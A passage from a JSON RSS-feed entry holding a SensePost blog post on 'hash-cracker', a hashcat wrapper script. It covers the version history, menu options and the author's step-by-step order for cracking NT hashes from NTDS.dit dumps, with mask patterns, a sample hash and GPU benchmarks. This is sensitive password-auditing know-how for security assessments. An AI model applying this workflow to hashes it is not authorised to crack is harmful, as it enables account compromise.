mobile GPU was more noticeable.\nv2.0\nThe first version had some improvements in the time between releasing v2.0. The major change for v2.0 was moving everything from the main script and into separate files that would be sourced when called. This has two benefits, first the ability to extend and adapt extra features more easily, secondly someone else could actually find what the ‘processors’ were doing.\nWith v1.7 the Python2 based Password Analysis and Cracking Kit (PACK) was added as functionality. This was expanded on during the development of v2.x – eventually resulting in two effective options, namely:\nPACK rulegen\nPACK mask\nAs the name implies, rulegen is able to create a new ‘rule’ based on the already cracked passwords. So, it takes the cracked passwords from the current potfile (database with hash:plaintext), and performs an analysis for patterns. A rule is created upon the results and this can be used to perform a rule based attack (wordlist + rule).\nThe mask function does basically the same, but the output is slightly different. This function will output a set of brute-force patterns based on the already cracked passwords. These brute-force patterns are run as-is.\nIn October 2021, Apple introduced the Apple Silicon M1 Pro / Max processors for their Pro line of MacBooks. After the first models were delivered, hashcat benchmarks started popping up. During this period, I also ordered a M1 Pro equipped MacBook. Since some binaries in hash-cracker are pre-compiled for x64-based systems it would not work directly.\nWhen I got delivery I started compiling the needed binaries to release a Apple Silicon version of hash-cracker. So, (almost) everything from v2.6 was used as starting point for the first release, namely v2.7 – Apple Silicon Edition.\nAfter this new highlight in the hash-cracker journey, I started implementing more options, more logic and playing with variables for almost everything (instead of hardcoding).\nv3.x\nVersion 3.0 arrived with some small but welcome additions like multi-wordlist support, re-arranged menu and getting rid of hardware monitoring.\nFrom there I started moving some stuff over to separate, source-able, scripts. Also, with the release of v3.1, it is now possible to choose whether or not you use optimised kernels. The most important use-case for optimised kernels is the fact they are optimised for a specific hash mode instead of a bunch. This makes them a lot quicker, but are limited to a character length of 32. Soifthisisyourpassworditwillnotbecrackedwithoptimisedkernels. By default, optimised kernels are enabled but you can disable them by adding the -n flag when starting hash-cracker.\nBelow v3.1 with the kernel option build in, nice!\n$ ./hash-cracker.sh -n\nhash-cracker v3.1 by crypt0rr (https://github.com/crypt0rr)\n\nChecking if requirements are met:\n[+] Hashcat is installed\n[+] common-substr is executable\n[+] Python2 available\n[+] expander is executable\n[+] Potfile \"hash-cracker.pot\" present\n[-] Optimised kernels disabled\n[...]\nv3.2 – CeWL\nFor those who don’t know CeWL, this is a Custom Word List Generator. The script scrapes information from the site given to it, you can specify the depth and word length you want to save. This is especially useful during assessments for clients with a website, which company doesn’t have one nowadays?\nv3.4 – More Flexibility\nThe latest version as of (2023-03) is v3.4, which supports some more helpful options but most importantly:\nProper handling of creating and deleting temporary files – no more tmp_ files in the root directory\nProper cleanup of temporary files when the user stops hash-cracker with CTRL+C\nNumbers of the available options are now reflected in the script names to make them directly recognizable\nParameter handling when the user specifies one or more arguments at CLI\nAbility to disable both optimised kernel and loopback functionality\nHave a look at that help menu:\n$ ./hash-cracker.sh -h\nNote: flags are optional, by default hash-cracker will run with optimized kernels enabled and perform loopback actions.\n\nUsage: ./hash-cracker [FLAG]\n\nFlags:\n -l / --no-loopback\n   Disable loopback functionality\n -n / --no-limit\n   Disable the use of optimized kernels (un-limits password length)\n -m / --module-info\n   Display information around modules/options\n -s [hash-name] / --search [hash-name]\n   Will search local DB for hash module. E.g. '-s ntlm'\nSo, with the now released v3.4 the following menu is shown to the user. 19 options, all based on efficiency but able to run for days if you want to.\n$ ./hash-cracker.sh \nhash-cracker v3.4 by crypt0rr (https://github.com/crypt0rr)\n\nMandatory modules:\n[+] Hashcat is executable\n[+] Potfile \"hash-cracker.pot\" present\n\nOptional modules:\n[+] Common-substr is executable\n[+] Python2 is executable\n[+] Expander is executable\n[+] CeWL is executable\n\nVariable Parameters:\n[+] Optimised kernels enabled\n[+] Loopback enabled\n\n0. Exit\n1. Brute force\n2. Light rules\n3. Heavy rules\n4. Enter specific word/name/company\n5. Enter specific word/name/company (brute force)\n6. Hybrid\n7. Toggle-case\n8. Combinator\n9. Iterate results\n10. Prefix suffix (advise: first run steps above)\n11. Common substring (advise: first run steps above)\n12. PACK rulegen\n13. PACK mask\n14. Fingerprint attack\n15. Directory of word lists plain and then with OneRuleToRuleThemAll\n16. Username iteration (only complete NTDS)\n17. Markov-chain passwords generator\n18. CeWL wordlist generator\n19. Digit remover\n\nPlease enter job number: \nv3.5 – Small bump in supported hashtypes\nUpdated supported hash types, based on hashcat v6.2.6-420-gdc51a1a97\nv3.6 – Stacker\nThe 4th of May is World Password Day – so hash-cracker got a quick update which would help cracking password hashes even more on this special day.\nHashcat released the stacking58 rule, hashcat describes this rule as “This rule file is designed to act as a base for usage in a rule stacking runs.”. So, hash-cracker got a new option ’20’. This option will use the new stacking58 rule and do some magic with other rules resulting in a cool new set of cleartexts for your remaining hashes!\nv3.7 – Just before\nWhen asking people on points to improve hash-cracker, having a static configuration file for the hashlist and hashtype have been recurring themes. So, with the release of this blogpost, I’ve also released version 3.7 doing exactly this.\nIntroducing hash-cracker.conf the location where you can set 4 things, namely:\nHASHCAT – binary path where you’ve installed hashcat\nHASHTYPE – mode hashcat will run in (e.g. 1000 (NTLM))\nHASHLIST – file containing target hashes\nPOTFILE – specify the potfile you want to use / create\nThe Options, how I use them and how they work\nhash-cracker v3.7 currently consists of 20 options. These options can be used in the order as available, or in random order. As you use the script more on different datasets, the smartest options for your hardware will naturally emerge.\nHow do I use the script itself? What options, what order?\nThe main datasets I use the script for are analysis of NT hashes extracted from NTDS.dit databases. This type of hash does not use, for example, salting or other techniques to increase the difficulty. When a password is converted to an NT hash then the same input will always produce the same output.\nFor example the password “Welcome0” will always result in NT: b6adc1c00024a2e4456de1e3d065af41.\nI also asked ChatGPT to explain what an NT hash is, below is the explanation I received.\nChatGPT explanation of the NT hash\n\n\n\nNormally I always start with option 1, brute-force. This option is going to perform a brute force action on the input with common patterns. A brute force attack involves holding a certain character set against the input in completeness and with random order. An Example of such pattern is “?l?l?l?l?d?d?d?d?d”. Here the ‘?d’ stands for digits 0-9 and ‘?l’ stands for lower-case ‘abcdefghijklmnopqrstuvwxyz’. This pattern will arrive at passwords like ‘Hola12345’ / ‘Boat8492’ / ‘Lolz1337’.\nAfter completing this brute-force (option 1), I usually run option 15 using as input all the word lists provided with hash-cracker. This option checks the word lists and adds variations using a rule. A rule creates variations on the entered passwords. Option 15 uses an improved version of OneRuleToRuleThemAll, called OneRuleToRuleThemStill. This option also provides interesting results when combined with other word lists, for example the list provided by hashmob.net, ‘HashMob Combined Full’ – at the time of writing 15.27GB in size.\nOnce this first batch is completed, I move on to option 9, iterations. This option grabs the jar file (hash-cracker.jar) and filters the already cracked passwords to a temporary file to perform actions with, for each iteration this action is performed, as at each step new passwords may have been cracked which again can serve as input. The temporary file with already cracked passwords is used as input for a rules-based cracking action. As mentioned earlier, rules create variations on the given input, in this case the passwords in the temporary file.\nOption 9 is often followed by options 10 and 11. Two options based on common-substr. Common-substr is a simple tool to extract the most common substrings from an input text and is built for password cracking. Option 10 is based on the ‘Prefix & Suffix Substrings’ module and option 11 concerns ‘All Substrings’.\nFor cracking longer passwords, or passwords where the user thinks they are clever by pasting the same password in sequence, option 8 was created. I often use this option in conjunction with the provided list ‘ignis-10M.txt’. An example of how this option works, the list (ignis-10M.txt) contains ‘password123’ and ‘password456’, option 8 will create ‘password123password123’ and ‘password123password456’ as candidates. Importantly, option 8 asks for two lists of words as input. The larger the second list (right list), the longer the duration of the option will be. This has to do with the underlying logic of hashcat. So for speed, it may be desirable to choose a larger list as the first list and a smaller list as the second list.\nAfter this action with option 8, I continue with option 6, “hybrid”. Hybrid says it all, a hybrid action is done using two techniques. On the one hand a dictionary, on the other hand brute-force. This option incorporates several patterns that I have classified as ‘common’ in the time I have been cracking passwords. For example, the pattern “Welcome1234!” a word followed by about four digits and an exclamation mark. The word list contains the word ‘Welcome’ and the brute-force pattern invents the rest with it ‘1234!’\nOften I end with a few repetitions of options 9, 10 and 11. After this I go through the results and see if any patterns stand out and try to get additional results using the same or other options.\nIn the end it’s mostly trial and error, you will naturally find a pattern that works well for the datasets and environments you interact with. Every country has its own patterns, every environment has its own patterns.\nStatistics for N3rds\nBut, how do the Apple Silicon M1 and M2 Pro perform against my previous NVIDIA M1200?\nBenchmark: NVIDIA M1200\nBenchmark: Apple Silicon M1 Pro\nBenchmark: Apple Silicon M2 Pro\nLet’s take some commonly used hash types to compare. Note, the M1200 used about 55W from the wall during benchmarking, and the M1 Pro used about 25W.\nComparison M1200/M1Pro/M2Pro\n\n\n\nPercentages\n\n\n\n\nExample Hashes\nTo start cracking hashes you first need hashes, that’s why hash-cracker comes with multiple sets of example hashes.\nMD5 – 416.612 hashes (download)\nSHA1 – 430.643 hashes (download)\nNTLM – 805.021 hashes (download)\nThere is More! Have You Been Pwned?\n‘;–have i been pwned? – probably the most recognised and well known platform collecting data from breaches in all forms and sizes – ran by Troy Hunt. You may have used it to check if your own (personal) email address has leaked? Otherwise, have a go on haveibeenpwned.com.\nThe dataset that is populated with hashes found in leaks and is available for download through the haveibeenpwned-downloader\nSome URLs to Bookmark\nhttps://kb.offsec.nl\nhttps://github.com/sensepost/hash-cracker\nhttps://github.com/sensepost/hash-cracker-apple-silicon\nhttps://saf.offsec.nl\nhttps://cyberchef.offsec.nl\nhttps://sensepost.com/blog/2018/cracking-efficiency-measurements-common-substring-attack/",
      "content": "Intro\n\n",
      "contentSnippet": "Intro",
      "guid": "https://sensepost.com/blog/2023/hash-cracker-password-cracking-done-effectively/",
      "isoDate": "2023-04-05T12:35:21.000Z",
      "itunes": {}
    }
  ],
  "feedUrl": "https://sensepost.com/rss.xml",
  "paginationLinks": {
    "self": "https://sensepost.com/rss.xml"
  },
  "title": "Orange Cyberdefense",
  "description": "doing the web 2.0 thing...",
  "pubDate": "Thu, 30 May 2024 11:19:55 +0000",
  "link": "https://sensepost.com/rss.xml",
  "itunes": {}
}